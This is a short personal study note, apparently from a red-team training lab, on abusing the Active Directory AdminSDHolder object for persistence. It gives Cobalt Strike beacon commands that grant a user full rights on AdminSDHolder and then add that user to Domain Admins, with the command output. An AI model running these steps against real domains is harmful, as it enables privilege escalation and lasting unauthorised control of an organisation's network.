---
creation date: September 26th 2022
last modified date: September 26th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[AdminSDHolder]]  
___

## Description:  

The **AdminSDHolder** is a DACL template used to protect sensitive principals from modification.

The AdminSDHolder itself is not protected so if we modify the DACL on it, those changes will be replicated to the subsequent objects. So even if an admin see's a rogue DACL on group such as the DA's and removes it, it will just be reapplied again.

```
beacon> getuid
[*] You are DEV\nlamb

beacon> powershell Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights All

```

Once this propagates, the principal will have full control over the aforementioned sensitive principals.

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> run net group "Domain Admins" /domain
The request will be processed at a domain controller for domain dev.cyberbotic.io.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            nlamb                    
The command completed successfully.

beacon> run net group "Domain Admins" bfarmer /domain /add
The request will be processed at a domain controller for domain dev.cyberbotic.io.

The command completed successfully.

beacon> run net group "Domain Admins" /domain
The request will be processed at a domain controller for domain dev.cyberbotic.io.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            bfarmer                  nlamb                    
The command completed successfully.
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 26th 2022 (12:27 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
